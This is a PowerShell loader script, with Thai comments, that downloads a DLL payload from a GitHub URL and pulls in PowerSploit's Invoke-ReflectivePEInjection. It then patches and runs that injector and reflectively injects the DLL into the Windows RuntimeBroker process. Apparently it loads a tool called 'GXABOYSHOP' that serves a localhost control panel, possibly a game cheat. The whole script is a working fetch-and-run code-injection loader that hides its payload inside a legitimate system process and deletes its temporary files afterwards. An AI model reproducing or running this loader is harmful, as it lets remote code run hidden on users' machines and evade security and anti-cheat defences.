$ErrorActionPreference = "Stop"

# === UPHEAVAL DLL Loader ===
# วิธีใช้:
# 1. Build โปรเจค RennyX-DLL (Release x64) จะได้ UPHEAVAL.dll
# 2. เปลี่ยนชื่อ UPHEAVAL.dll -> payload
# 3. อัพไฟล์ payload ขึ้น GitHub repo
# 4. เปลี่ยน URL ด้านล่างให้ชี้ไปที่ไฟล์ payload บน GitHub
# (หรือรัน build_payload.bat จะทำให้อัตโนมัติ)
$payloadUrl = "https://raw.githubusercontent.com/mk121X/valorant/refs/heads/main/payload"

Write-Host ""
Write-Host "   ██████╗ ██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗ " -ForegroundColor Magenta
Write-Host "  ██╔════╝ ╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔════╝██║  ██║██╔═══██╗██╔══██╗" -ForegroundColor Magenta
Write-Host "  ██║  ███╗ ╚███╔╝ ███████║██████╔╝██║   ██║ ╚████╔╝ ███████╗███████║██║   ██║██████╔╝" -ForegroundColor Magenta
Write-Host "  ██║   ██║ ██╔██╗ ██╔══██║██╔══██╗██║   ██║  ╚██╔╝  ╚════██║██╔══██║██║   ██║██╔═══╝ " -ForegroundColor Magenta
Write-Host "  ╚██████╔╝██╔╝ ██╗██║  ██║██████╔╝╚██████╔╝   ██║   ███████║██║  ██║╚██████╔╝██║     " -ForegroundColor Magenta
Write-Host "   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     " -ForegroundColor Magenta
Write-Host ""

# Step 1: Find RuntimeBroker process
Write-Host "[*] Searching for RuntimeBroker..." -ForegroundColor Cyan
$proc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1

if ($null -eq $proc) {
    # Try to start a Store app to spawn RuntimeBroker
    Start-Process "ms-windows-store:" -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    $proc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($null -eq $proc) {
        Write-Host "[ERROR] RuntimeBroker not found. Open any Store app first." -ForegroundColor Red
        exit 1
    }
}
Write-Host "[+] Found RuntimeBroker PID: $($proc.Id)" -ForegroundColor Green

# Step 2: Download DLL payload
Write-Host "[*] Downloading payload..." -ForegroundColor Cyan
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$bytes = $wc.DownloadData($payloadUrl)
Write-Host "[+] Downloaded ($($bytes.Length) bytes)" -ForegroundColor Green

# Step 3: Download and patch Invoke-ReflectivePEInjection
Write-Host "[*] Preparing injector..." -ForegroundColor Cyan
$injectorUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
$tmpScript = "$env:TEMP\R_$(Get-Random).ps1"
Invoke-WebRequest -Uri $injectorUrl -OutFile $tmpScript -UseBasicParsing

# Patch for .NET compatibility
$content = Get-Content $tmpScript -Raw
$content = $content -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
$content = $content -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
$fixedScript = "$env:TEMP\R_fixed.ps1"
$content | Set-Content $fixedScript -Encoding UTF8
. $fixedScript

# Step 4: Inject DLL into RuntimeBroker
Write-Host "[*] Injecting into RuntimeBroker..." -ForegroundColor Cyan
try {
    Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $proc.Id
    Write-Host "[SUCCESS] GXABOYSHOP loaded successfully!" -ForegroundColor Green
    Write-Host "[*] Open http://localhost:8080 to access the control panel" -ForegroundColor Yellow
}
catch {
    Write-Host "[ERROR] Injection failed: $_" -ForegroundColor Red
    exit 1
}

# Cleanup temp files
Remove-Item $tmpScript -Force -ErrorAction SilentlyContinue
Remove-Item $fixedScript -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "[*] Press any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
